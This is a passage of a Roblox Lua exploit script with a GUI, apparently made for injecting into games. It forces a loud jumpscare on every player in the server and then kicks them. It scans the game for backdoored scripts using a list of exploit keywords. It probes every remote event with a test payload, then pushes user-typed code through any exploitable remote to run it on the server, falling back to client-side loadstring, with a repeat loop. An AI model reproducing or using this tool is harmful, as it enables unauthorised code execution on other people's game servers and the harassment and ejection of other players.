    end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = player.PlayerGui

    local blackdead = Instance.new("Frame")
    blackdead.Name = "blackdead"
    blackdead.Parent = screenGui
    blackdead.BackgroundColor3 = Color3.new(0, 0, 0)
    blackdead.Size = UDim2.new(1, 0, 1, 0)
    blackdead.Position = UDim2.new(0, 0, 0, 0)
    blackdead.ZIndex = 0

    local obama = Instance.new("ImageLabel")
    obama.Name = "obama"
    obama.Parent = screenGui
    obama.BackgroundTransparency = 1
    obama.AnchorPoint = Vector2.new(0.5, 0.5)
    obama.Position = UDim2.new(0.5, 0, 0.5, 0)
    obama.Size = UDim2.new(1, 0, 1, 0)
    obama.Image = "rbxassetid://5643866"
    obama.Visible = true

    local obunga = Instance.new("ImageLabel")
    obunga.Name = "obunga"
    obunga.Parent = screenGui
    obunga.BackgroundTransparency = 1
    obunga.AnchorPoint = Vector2.new(0.5, 0.5)
    obunga.Position = UDim2.new(0.5, 0, 0.5, 0)
    obunga.Size = UDim2.new(1, 0, 1, 0)
    obunga.Image = "rbxassetid://15603607126"
    obunga.ImageTransparency = 1

    local help = Instance.new("ImageLabel")
    help.Name = "help"
    help.Parent = screenGui
    help.BackgroundTransparency = 1
    help.AnchorPoint = Vector2.new(0.5, 0.5)
    help.Position = UDim2.new(0.5, 0, 0.5, 0)
    help.Size = UDim2.new(1, 0, 1, 0)
    help.Image = "rbxassetid://2050833946"
    help.ImageTransparency = 1
    help.ZIndex = 0

    local nope = Instance.new("Sound")
    nope.Name = "nope"
    nope.SoundId = "rbxassetid://9072304992"
    nope.Volume = 19866
    nope.Parent = screenGui

    local nope2 = Instance.new("Sound")
    nope2.Name = "nope2"
    nope2.SoundId = "rbxassetid://9041745502"
    nope2.Volume = 19866
    nope2.Parent = screenGui

    local static = Instance.new("Sound")
    static.Name = "static"
    static.SoundId = "rbxassetid://5547866547"
    static.Volume = 19866
    static.Parent = screenGui
    
    nope:Play()

    repeat
        wait(3.8)
    until nope.TimePosition >= 0

    for i = 1, 10 do
        obama.ImageTransparency = obama.ImageTransparency + 0.1
        wait()
    end
    obama.ZIndex = 0

    repeat
        wait(4.5)
    until nope.TimePosition >= 0

    for i = 1, 10 do
        obunga.ImageTransparency = obunga.ImageTransparency - 0.1
        wait(0.1)
    end

    wait(0)
    help.ImageTransparency = 0

    repeat
        wait()
    until nope.TimePosition >= 0

    nope2:Play()

    spawn(function()
        while nope2.Playing == true do
            wait(math.random(1, 7))
            static:Play()
            help.ZIndex = 2
            wait(0.3)
            help.ZIndex = 0
            static:Stop()
        end
    end)

    repeat
        wait(1)
    until not nope2.Playing

    screenGui:Destroy()
    Instance.new("Hint", workspace.Terrain).Text = "Obunga is still here. You are not safe."
     wait(17)
     player:Kick("Obunga is start to chasing you. You are not S̸a̸f̸e̶.")
end

ocnf14.MouseButton1Click:Connect(function()
for _, player in Players:GetPlayers() do
    spawn(function()
        runObungaEffect(player)
    end)
    end
end)


function GetRandomColor()
   randomColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
  return randomColor
end


function RandomizeColors(obj)
  if obj:IsA("BasePart") then
    obj.BrickColor = BrickColor.random()
  end
  for _, child in ipairs(obj:GetChildren()) do
    RandomizeColors(child)
  end
end


isLooping = false
renderSteppedConnection = nil

function OnButtonClick()
  if not isLooping then
    isLooping = true
    if not renderSteppedConnection then
      renderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(function()
        if isLooping then 
          RandomizeColors(game.Workspace)
        end
      end)
    end
    ocnf21.Text = "Stop Randomize"
  else
    isLooping = false 
    ocnf21.Text = "Start Randomize"
  end
end

ocnf21.MouseButton1Click:Connect(OnButtonClick)
ocnf21.Text = "Random Colors"

-- Credit to k00lkidd81 in rscripts.net for backdoor scanner (i think there is no more backdoored games?)

local exploitableRemote: RemoteEvent | RemoteFunction | nil = nil
local currentExecutionMode: "Default" | "Client" | "Server" = "Default" 

local function deepScanForBackdoors(): { [number]: { Type: string, Path: string, Object: Instance } }
    print("Starting deep scan for backdoors...")

    local suspicious: { [number]: { Type: string, Path: string, Object: Instance } } = {}
    local remoteEvents: { [number]: { Type: string, Path: string, Object: Instance } } = {}
    local hiddenScripts: { [number]: { Type: string, Path: string, Object: Instance } } = {}

    
    for _, service in pairs(game:GetChildren()) do
        
        for _, obj in pairs(service:GetDescendants()) do
            
            if (obj:IsA("Script") or obj:IsA("LocalScript")) then
                local objNameLower = obj.Name:lower()
                if (objNameLower:match("^script%d+$") or 
                    objNameLower:match("^module%d+$") or 
                    objNameLower:match("backdoor") or
                    objNameLower:match("exploit") or
                    objNameLower:match("inject") or
                    objNameLower:match("remote") or
                    objNameLower:match("cmd") or
                    objNameLower:match("admin")) then
                    table.insert(suspicious, {
                        Type = "Suspicious Script Name",
                        Path = obj:GetFullName(),
                        Object = obj
                    })
                end
            end

            
            if (obj:IsA("Script") or obj:IsA("LocalScript")) and
               (obj.Name == "" or not obj.Enabled) then
                table.insert(hiddenScripts, {
                    Type = "Hidden Script",
                    Path = obj:GetFullName(),
                    Object = obj
                })
            end

            
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remoteEvents, {
                    Type = obj.ClassName,
                    Path = obj:GetFullName(),
                    Object = obj
                })
            end
        end
    end

    
    local function analyzeScript(scriptObject: Script | LocalScript): boolean
        local src: string = ""
        local success, result = pcall(function()
            src = scriptObject.Source 
        end)

        if not success then
            warn("Could not read script source for:", scriptObject:GetFullName(), "Error:", result)
            return false 
        end

        
        local indicators: { string } = {
            "require%(%-?%d+%)",               
            "game:GetService%(%'HttpService'%)", 
            "Instance%.new%(%'RemoteEvent'%)",  
            "LoadLibrary",                     
            "getfenv", "setfenv",              
            "getgc", "getreg", "getnil",       
            "hookfunction", "newcclosure",     
            "setclipboard", "getclipboard",    
            "synapse", "krnl", "wearedevs",    
            "exec", "dofile", "runstring",     
            "pcall%(game%.Players%.%a+%.LoadCharacter%)", 
            "fireclient", "fireserver", "invokeclient", "invokeserver" 
        }

        for _, pattern in ipairs(indicators) do
            if src:match(pattern) then
                return true 
            end
        end
        return false 
    end 

    
    for _, item in ipairs(suspicious) do
        if item.Object:IsA("Script") or item.Object:IsA("LocalScript") then
            if analyzeScript(item.Object) then
                item.Type = "CONFIRMED " .. item.Type 
            end
        end
    end

    for _, item in ipairs(hiddenScripts) do
        if item.Object:IsA("Script") or item.Object:IsA("LocalScript") then
            if analyzeScript(item.Object) then
                item.Type = "CONFIRMED " .. item.Type
                table.insert(suspicious, item) 
            end
        end
    end

    
    for _, remote in ipairs(remoteEvents) do
        local hasSecurity = false
        if remote.Object:FindFirstChild("SecurityCheck") then
            hasSecurity = true
        end

        if not hasSecurity then
            remote.Type = "Unprotected " .. remote.Type
            table.insert(suspicious, remote) 
        end
    end

    return suspicious
end

local function findExploitableRemote(): RemoteEvent | RemoteFunction | nil
    local commonNames: { string } = {
        "ExecuteScript", "ExecuteCode", "AdminCommand", "Backdoor",
        "RemoteCommand", "ServerInvoke", "RunScript", "RunCode",
        "Execute", "Command", "Admin", "Remote", "CMD", "Shell", "Run"
    }

    for _, service in pairs(game:GetDescendants()) do
        if service:IsA("RemoteEvent") or service:IsA("RemoteFunction") then
            
            for _, name in ipairs(commonNames) do
                if service.Name:lower():match(name:lower()) then
                    return service 
                end
            end

            
            local success, _ = pcall(function()
                if service:IsA("RemoteEvent") then
                    service:FireServer("test_payload_from_detector")
                else
                    service:InvokeServer("test_payload_from_detector")
                end
            end)

            if success then
                
                return service
            end
        end
    end

    return nil 
end


function remoteExecute(scriptContent: string): boolean
    if exploitableRemote then
        notif({
		Text = "Attempting remote execution via: " .. exploitableRemote:GetFullName(),
		Duration = 5,
		topm = "Information!"
	})
        local success, result = pcall(function()
            if exploitableRemote:IsA("RemoteEvent") then
                exploitableRemote:FireServer(scriptContent)
            else
                
                local response = exploitableRemote:InvokeServer(scriptContent)
                warn("RemoteFunction invoked, response:", response) 
            end
        end)
        if success then
            print("Remote execution successful!")
            return true
        else
            notif({
		Text = "Remote execution failed: " .. tostring(result),
		Duration = 5,
		topm = "Information!"
	})
            return false
        end
    else
        notif({
		Text = "No exploitable remote found for server execution.",
		Duration = 5,
		topm = "Information!"
	})
    end
    return false 
end

function executeClientSideCode(code: string)
    local success, err = pcall(function()
        local func = loadstring(code) 
        if func then
            func() 
        else
            notif({
		Text = "loadstring returned nil or could not load script.",
		Duration = 5,
		topm = "Information!"
	})
        end
    end)
    if success then
    -- 
    else
        notif({
		Text = "Error executing client-side script: "..tostring(err),
		Duration = 5,
		topm = "Information!"
	})
    end
end

function executeScriptBasedOnMode(scriptContent: string)
    if scriptContent:len() == 0 then
        notif({
		Text = "Script content is empty.",
		Duration = 5,
		topm = "Dumbass!"
	})
        return
    end


    if currentExecutionMode == "Default" then
        local remoteSuccess = remoteExecute(scriptContent)
        if not remoteSuccess then
            
            executeClientSideCode(scriptContent)
        end
    elseif currentExecutionMode == "Server" then
        
        local remoteSuccess = remoteExecute(scriptContent)
        if not remoteSuccess then
            notif({
		Text = "Server execution failed or no exploitable remote found.",
		Duration = 5,
		topm = "No backdoor!"
	})
        end
    elseif currentExecutionMode == "Client" then
        
        executeClientSideCode(scriptContent)
    end
end

function setExecutionMode(mode: "Default" | "Client" | "Server")
    if mode == "Default" or mode == "Client" or mode == "Server" then
        currentExecutionMode = mode
        print("Execution mode set to: " .. currentExecutionMode)
    else
        warn("Invalid execution mode: '" .. tostring(mode) .. "'. Valid modes are 'Default', 'Client', 'Server'.")
    end
end

isLooping = false
loopTask = nil

loope.MouseButton1Click:Connect(function()
    if not isLooping then
        local loopSpeedText = loopbx.Text
        local loopSpeed = tonumber(loopSpeedText)

        if loopSpeed and loopSpeed > 0 then
            isLooping = true
            loope.Text = "Stop Loop"
            loopTask = task.spawn(function()
                while isLooping do
                    local scriptContent = codeTextBox.Text
                    executeScriptBasedOnMode(scriptContent)
                    task.wait(loopSpeed)
                end
            end)
        else
            notif({
		Text = "Invalid loop speed.",
		Duration = 5,
		topm = "0 Braincells!"
	})
        end
    else
        isLooping = false
        loope.Text = "Loop"
        if loopTask then
            task.cancel(loopTask)
            loopTask = nil
        end
    end
end)

loopButt.MouseButton1Click:Connect(function()
    local scriptContent = codeTextBox.Text
    executeScriptBasedOnMode(scriptContent)
end)

modes = {"Default", "Client", "Server"}
currentModeIndex = 1

febypassfake.MouseButton1Click:Connect(function()
    currentModeIndex = currentModeIndex % #modes + 1
    local newMode = modes[currentModeIndex]
    setExecutionMode(newMode)
    febypassfake.Text = "Execution: " .. newMode
end)

febypass.MouseButton1Click:Connect(function()
notif({
		Text = "Backdoor Scan Maybe not working",
		Duration = 5,
		topm = "no backdoor in 2025!"
	})
    print("Manual scan initiated by button.")
    local suspiciousItems = deepScanForBackdoors()
    exploitableRemote = findExploitableRemote() 

    print("\n--- Deep Scan Results (Manual) ---")
    if #suspiciousItems > 0 then
        warn("Found " .. #suspiciousItems .. " potential backdoors!")
        print("--- Detected Backdoors:")
        for _, item in ipairs(suspiciousItems) do
            print(string.format("[%s] %s", item.Type, item.Path))
        end
    else
        print("No suspicious items found during manual deep scan.")
    end

    if exploitableRemote then
        warn("Found potentially exploitable remote: " .. exploitableRemote:GetFullName())
        print("This remote might allow server-side code execution if not properly secured.")
    else
        print("No easily exploitable remotes found.")
    end
    print("--- Scan Complete ---")
end)

function updateTime()
	local currentTime = os.date("%I:%M:%S %p")
	local currentDate = os.date("%A, %B %d, %Y")
	info2.Text = "Time: " .. currentTime .. "\nDate: " .. currentDate
end

updateTime()
while true do
	updateTime()
	wait(1)
end
